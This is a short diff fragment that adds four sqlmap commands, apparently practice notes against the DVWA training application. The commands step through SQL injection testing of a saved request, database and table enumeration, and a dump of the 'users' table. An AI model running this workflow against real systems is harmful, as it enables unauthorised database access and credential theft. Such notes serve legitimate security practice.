@@ -1,0 +1,4 @@
+sqlmap -r request.txt -p <parameter>
+sqlmap -r request.txt -p <parameter> --dbs
+sqlmap -r request.txt -p <parameter> -D dvwa --tables
+sqlmap -r request.txt -p <parameter> -D dvwa -T users --dump
